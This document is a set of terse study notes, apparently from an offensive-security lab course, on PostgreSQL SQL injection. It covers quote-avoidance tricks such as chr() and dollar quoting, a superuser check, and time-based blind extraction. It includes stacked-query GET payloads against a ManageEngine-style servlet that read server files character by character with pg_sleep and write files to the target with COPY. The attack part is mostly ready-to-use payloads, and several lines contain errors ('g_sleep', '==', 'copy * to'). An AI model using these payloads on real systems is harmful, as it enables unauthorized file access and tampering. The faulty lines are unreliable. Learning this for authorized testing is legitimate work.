
## chr
chr the quote simbol won't work with functions like copy. Example below.
```sql
select chr(119) || chr(48) || chr(48) || chr(116) ;
```
## notmal quotes
```sql
select 'w00t';
```
## double dollar
```sql
select $$w00t$$;
copy * to $$\<path>\output.txt$$;
```
## tag 
```sql
select $TAG$w00t$TAG$;
```
## check if the PostgreSQL is super user
```sql
select case when (current_setting($$is_superuser$$))==$$on$$ then g_sleep(5) end;
```
## time base attack
we cannot directly read the data from the file in the server's response when we use stacked queries. Therefore, the request will once again use a time-based comparison logic to infer the data. If the comparison evaluates to true, the query will sleep for 10 seconds. Using this technique, we can extract the contents of any file.
```url
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
```
```url
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+ 
```

## write on target system using sql
```sql
COPY (SELECT $$offsec$$) to $$c:\\offsec.txt$$;
```
```url
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+ HTTP/1.0
```
